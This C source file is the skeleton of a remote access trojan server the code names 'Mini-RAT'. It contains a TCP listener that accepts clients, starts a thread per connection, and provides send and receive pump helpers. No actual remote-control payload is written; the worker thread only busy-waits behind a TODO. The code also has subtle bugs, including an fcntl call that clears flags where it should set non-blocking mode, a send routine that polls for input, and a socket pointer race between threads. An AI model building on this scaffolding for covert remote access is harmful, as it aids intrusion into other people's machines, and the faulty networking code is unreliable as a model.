#include <server.h>
#include <session.h>
#include <logging.h>
#include <mini-rat.h>

void* listener(void *port) {
        uint16_t port_num = *(int*)port;
        int server_sock = socket(PF_INET, SOCK_STREAM, 0);
        struct sockaddr_in client_name;
        unsigned int client_name_len = sizeof(client_name);

        struct sockaddr_in name;
        memset(&name, 0, sizeof(name));
        name.sin_family = AF_INET;
        name.sin_port = htons(port_num);
        name.sin_addr.s_addr = htons(INADDR_ANY);
        if (bind(server_sock, (struct sockaddr*)&name, sizeof(name)) < 0) {
                log_msg(LOG_SEVERE, "Cannot bind to port %d\n", port_num);
                return NULL;
        }
        listen(server_sock, 5);
        log_msg(LOG_INFO, "Mini-RAT running on port %d\n", port_num);

        int client_sock = 0;
        pthread_t newthread;
        while ((client_sock = accept(server_sock, (struct sockaddr*)&client_name, &client_name_len))) {
                pthread_create(&newthread, NULL, worker, (void*)&client_sock);
                pthread_detach(newthread);
        }

        close_logfile();
        close(server_sock);
        return 0;
}

void* worker(void *sock_desc) {
        int sock = *(int*)sock_desc;
        fcntl(sock, F_SETFL, fcntl(sock, F_GETFL, 0) & O_NONBLOCK);

        struct session *ses = find_session(init_session(sock));
        log_msg(LOG_INFO, "New session created with ID=%d\n", ses->id);

        // TODO: have this thread actually do something
        while (ses->alive == 1);

        return 0;
}

ssize_t output_pump(int sock, char *buffer, size_t sz) {
        struct pollfd pfd[1];
        pfd[0].fd = sock;
        pfd[0].events = POLLIN;
        int status = poll(pfd, 1, 15000);
        if (status < 0)
                return -1;
        else if (pfd[0].revents & POLLIN)
                return send(sock, buffer, sz, 0);

        return 0;
}

ssize_t input_pump(int sock, char *buffer, size_t sz) {
        struct pollfd pfd[1];
        pfd[0].fd = sock;
        pfd[0].events = POLLIN;
        int status = poll(pfd, 1, 15000);
        if (status < 0)
                return -1;
        else if (pfd[0].revents & POLLIN)
                return recv(sock, buffer, sz, 0);
        
        return 0;
}
